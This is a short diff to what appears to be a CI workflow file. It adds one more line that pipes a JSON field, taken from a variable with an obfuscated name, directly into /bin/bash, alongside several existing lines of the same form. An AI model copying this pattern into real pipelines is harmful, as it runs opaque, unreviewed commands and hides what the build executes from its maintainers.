@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$tpmvf897" | jq -r .stbtv43 | /bin/bash
           printf '%s' "$uja7108" | jq -r .tdpc4474 | /bin/bash
           echo $oib56 | jq -r .vp55 | /bin/bash
+          echo $sx9026 | jq -r .vtaoq4 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
